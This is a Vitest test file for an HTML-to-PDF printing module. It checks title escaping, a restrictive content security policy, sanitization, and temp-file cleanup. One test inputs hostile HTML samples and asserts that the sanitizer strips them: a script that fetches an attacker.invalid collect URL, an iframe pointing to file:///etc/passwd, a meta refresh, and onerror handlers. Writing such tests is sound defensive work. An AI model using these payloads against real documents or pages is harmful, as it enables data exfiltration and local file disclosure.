import { readFile } from 'node:fs/promises'
import { existsSync, readdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname } from 'node:path'
import { describe, expect, it, vi } from 'vitest'
import {
  buildPrintableHtml,
  printHtmlToPdf,
  sanitizePrintableBody,
  type PrintWindow,
} from '../src/print-html-pdf'

describe('buildPrintableHtml', () => {
  it('escapes the title, sanitizes the body, and installs a restrictive CSP', () => {
    const html = buildPrintableHtml('<A & B>', '<h1>Title</h1><p>Body</p>')
    expect(html).toContain('<title>&lt;A &amp; B&gt;</title>')
    expect(html).toContain('<body><h1>Title</h1><p>Body</p></body>')
    expect(html).toContain(`default-src 'none'`)
    expect(html).toContain(`form-action 'none'`)
    expect(html).toContain('<style>')
  })

  it('removes resource-loading tags, active content, URLs, and attributes', () => {
    const html = buildPrintableHtml(
      'Safe',
      [
        '<meta http-equiv="refresh" content="0;url=https://attacker.invalid">',
        '<style>@import "https://attacker.invalid/style.css";</style>',
        '<script>fetch("https://attacker.invalid/collect")</script>',
        '<iframe src="file:///etc/passwd"></iframe>',
        '<img src="http://127.0.0.1/private.png" onerror="alert(1)">',
        '<h1 onclick="alert(1)" style="background:url(https://attacker.invalid)">Report</h1>',
        '<p><a href="https://attacker.invalid" data-secret="x">source</a></p>',
      ].join(''),
    )
    expect(html).not.toContain('attacker.invalid')
    expect(html).not.toContain('127.0.0.1')
    expect(html).not.toContain('file:///')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('<iframe')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('onclick')
    expect(html).not.toContain('data-secret')
    expect(html).toContain('<h1>Report</h1>')
    expect(html).toContain('<a>source</a>')
  })
})

describe('sanitizePrintableBody', () => {
  it('keeps the restricted document structure and unwraps unknown containers', () => {
    expect(
      sanitizePrintableBody(
        '<section><h2>Heading</h2><p>Text <strong>bold</strong><formula>x^2</formula></p></section>',
      ),
    ).toBe('<h2>Heading</h2><p>Text <strong>bold</strong><formula>x^2</formula></p>')
  })
})

function fakeWindow(over: Partial<PrintWindow['webContents']> = {}) {
  const seen: { html?: string; dir?: string } = {}
  const win = {
    loadFile: vi.fn(async (path: string) => {
      seen.dir = dirname(path)
      seen.html = await readFile(path, 'utf8')
    }),
    destroy: vi.fn(),
    webContents: {
      printToPDF: vi.fn(async () => Buffer.from('%PDF-fake')),
      ...over,
    },
  } as unknown as PrintWindow
  return { win, seen }
}

describe('printHtmlToPdf', () => {
  it('loads the HTML from a temp file, prints, and cleans up', async () => {
    const { win, seen } = fakeWindow()
    const html = buildPrintableHtml('Test', '<p>hi</p>')
    const bytes = await printHtmlToPdf(html, () => win)
    expect(bytes.toString()).toBe('%PDF-fake')
    expect(seen.html).toBe(html)
    expect(win.destroy).toHaveBeenCalledOnce()
    expect(seen.dir && existsSync(seen.dir)).toBe(false)
  })

  it('destroys the window and removes the temp dir when printing fails', async () => {
    const { win, seen } = fakeWindow({
      printToPDF: vi.fn(async () => Promise.reject(new Error('print failed'))),
    })
    await expect(printHtmlToPdf(buildPrintableHtml('Test', ''), () => win)).rejects.toThrow(
      'print failed',
    )
    expect(win.destroy).toHaveBeenCalledOnce()
    expect(seen.dir && existsSync(seen.dir)).toBe(false)
  })

  it('removes the temp dir when the window cannot be created', async () => {
    const leftovers = () => readdirSync(tmpdir()).filter((d) => d.startsWith('genoffice-ai-doc-'))
    const before = leftovers().length
    await expect(
      printHtmlToPdf(buildPrintableHtml('Test', ''), () => {
        throw new Error('no window')
      }),
    ).rejects.toThrow('no window')
    expect(leftovers().length).toBe(before)
  })
})
